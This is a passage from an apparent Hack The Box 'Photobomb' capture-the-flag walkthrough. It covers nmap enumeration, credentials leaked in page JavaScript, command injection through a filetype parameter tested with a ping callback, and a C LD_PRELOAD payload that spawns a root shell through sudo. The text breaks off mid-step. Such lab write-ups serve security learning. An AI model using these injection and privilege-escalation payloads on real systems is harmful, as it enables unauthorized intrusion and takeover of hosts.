# Enumeration
## Nmap
```bash
nmap -sC -sV -oA nmap/photobomb 10.10.11.182
Starting Nmap 7.93 ( https://nmap.org ) at 2022-11-03 07:17 EDT
Nmap scan report for photobomb.htb (10.10.11.182)
Host is up (0.060s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 e22473bbfbdf5cb520b66876748ab58d (RSA)
|   256 04e3ac6e184e1b7effac4fe39dd21bae (ECDSA)
|_  256 20e05d8cba71f08c3a1819f24011d29e (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Photobomb
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

## Port 80
domain redirect -> photobomb.htb
Looking at the page source it pulls in a javascript file.
This file has credentials and an endpoint to login to.
```javascript
function init() {
  // Jameson: pre-populate creds for tech support as they keep forgetting them and emailing me
  if (document.cookie.match(/^(.*;)?\s*isPhotoBombTechSupport\s*=\s*[^;]+(.*)?$/)) {
    document.getElementsByClassName('creds')[0].setAttribute('href','http://pH0t0:b0Mb!@photobomb.htb/printer');
  }
}
window.onload = init;
```

This shows a page where you can download a file. Analyzing the request in burpsuite shows that it is passing 3 parameters.

```http
POST /printer HTTP/1.1
Host: photobomb.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 78
Origin: http://photobomb.htb
Authorization: Basic cEgwdDA6YjBNYiE=
Connection: close
Referer: http://photobomb.htb/printer
Upgrade-Insecure-Requests: 1

photo=voicu-apostol-MWER49YaD-M-unsplash.jpg&filetype=jpg&dimensions=3000x2000
```
Removing parameters one at a time gives a ruby error.
dimensions:
`if !dimensions.match(/^[0-9]+x[0-9]+$/)`

file type:
`if !filetype.match(/^(png|jpg)/)`

photo:
`if photo.match(/\.{2}|\//)`

From here you can blindly fuzz things things or check the conditions for each parameter.
The file type only checks what the string beings with so the payload will take the form:
```
jpg<code>
```
check for code execution by pinging our host.
```
jpg; ping 10.10.14.18
```
url encode.
```
filetype=jpg%3b+ping+10.10.14.18
```
Start a tcpdump to check if the code ran.
```bash
sudo tcpdump -i tun0
```

This calls back to us!

# Exploit
As it is a ruby application my first thought was bash reverse shell. which didnt work. So a python one? nope, python3 yep :)

Now we are the wizard user.
checks for sudo -l we can run a backup.sh file with sudo.

It seems that LD_Preload is working so try a suid for bash within a file.
```
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
```
then compile it to 